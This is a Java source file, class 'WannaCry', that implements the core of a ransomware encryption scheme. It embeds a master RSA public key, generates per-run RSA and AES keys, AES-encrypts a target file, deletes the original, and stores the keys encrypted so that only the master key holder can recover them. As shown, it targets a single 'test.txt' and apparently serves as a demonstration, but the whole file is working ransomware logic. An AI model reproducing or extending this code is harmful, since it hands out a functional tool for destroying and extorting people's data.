import java.io.File;
import java.io.FileOutputStream;
import java.nio.file.Files;
import java.security.Key;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

public class WannaCry {

    private static final String ENCODED_MASTER_RSA_KEY = "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAidRWp1iB0s2LKnAyAxUKCMmsKK9bMTdRUItZVRcV4lB0RXGla0wRTNeR6r5oqNo6poHUJ+QGPjAHDCzt/MjAZdtuMSQ+Lohn+TjDMIEi2sUNeXhZuXchw/EE+3QTgPpIOGhjJtv4wmTjXD5UaZbYWuydNpgvFEDsF4jf02xM8t8a7nOgQIriPi83f/a4XHXcoCcGEHDbpbtYUhVq12rJEBXUoVM1zi9LcDhEsgil/pzRPlkT6zC+89SkgYHWTRtO2shLpJcnThkR1nyLqHU2Zgn1hSrNsy+T97bNL1Umhcs7/e94WJ7WWO6PoSs/t4cknPIZhhRbeBHoJ9rdV+XLBoew7buDQSht2Jn/zAm6A6Pvi+XhLVRlIEMLOsG6Y92Lwhuc21oS/Keqklv9yDfMznJm0aeCbm3TWZehAfPD9EKJ4LgvSVbTtXSiOVvPS8JtzIedISqioSvPPP5v4qqdbqobGBv2uE0sdwYhXh+dTIFSO4WG+dQHMZpdZu38l/FBec3yEuZJuK/pvtX5AvdYgCEwMioZxE3ph4X3S/JEbcqfR1KuuGnYwg6nmSEwotDVg55pEtSsgu3j2KRgM8GA7lkageikM4D6m/q6vQ5fkedfzz8PuvQn/Ne8BH3h2UZYmRjNvfKd8wt2bRKKFK7K4jCYT5riYo+5aEWSSrWvL+ECAwEAAQ==";
    private static final String INPUT_FILE = "test.txt";
    private static final String ENCRYPTED_FILE = "test.txt.cry";
    private static final String WANNA_CRY_KEY_FILE = "wannacry.key";
    private static final String AES_KEY_FILE = "aes.key";

    public static void main(String[] args) {
        try {
            PublicKey masterRSAPublicKey = generateMasterPublicKey();
            KeyPair freshRSAKeyPair = generateRSAKeyPair();

            byte[] encryptedPrivateKey = encryptKeyWithRSA(freshRSAKeyPair.getPrivate(), masterRSAPublicKey);
            writeBytesToFile(encryptedPrivateKey, WANNA_CRY_KEY_FILE);

            SecretKey aesKey = generateAESKey();

            byte[] rawText = readBytesFromFile(INPUT_FILE);
            byte[] encryptedText = encryptWithAES(rawText, aesKey);
            writeBytesToFile(encryptedText, ENCRYPTED_FILE);
            deleteFile(INPUT_FILE);

            byte[] encryptedAesKey = encryptKeyWithRSA(aesKey, freshRSAKeyPair.getPublic());
            writeBytesToFile(encryptedAesKey, AES_KEY_FILE);

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private static PublicKey generateMasterPublicKey() throws Exception {
        byte[] keyInBytes = Base64.getDecoder().decode(ENCODED_MASTER_RSA_KEY);
        X509EncodedKeySpec spec = new X509EncodedKeySpec(keyInBytes);
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        return keyFactory.generatePublic(spec);
    }

    private static KeyPair generateRSAKeyPair() throws Exception {
        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
        keyPairGenerator.initialize(512);
        return keyPairGenerator.genKeyPair();
    }

    private static SecretKey generateAESKey() throws Exception {
        KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
        keyGenerator.init(256, new SecureRandom());
        return keyGenerator.generateKey();
    }

    private static byte[] encryptWithAES(byte[] rawText, SecretKey aesKey) throws Exception {
        Cipher aesInstance = Cipher.getInstance("AES/CBC/PKCS5Padding");
        aesInstance.init(Cipher.ENCRYPT_MODE, aesKey, new IvParameterSpec(new byte[16]));
        return aesInstance.doFinal(rawText);
    }

    private static byte[] encryptKeyWithRSA(Key keyToEncrypt, Key encryptionKey) throws Exception {
        Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
        cipher.init(Cipher.ENCRYPT_MODE, encryptionKey);
        return cipher.doFinal(keyToEncrypt.getEncoded());
    }

    private static void writeBytesToFile(byte[] data, String filename) throws Exception {
        FileOutputStream outputStream = new FileOutputStream(new File(filename));
        outputStream.write(data);
        outputStream.close();
    }

    private static byte[] readBytesFromFile(String fileName) throws Exception {
        File file = new File(fileName);
        return Files.readAllBytes(file.toPath());
    }

    private static void deleteFile(String fileName) throws Exception {
        File file = new File(fileName);
        file.delete();
    }
}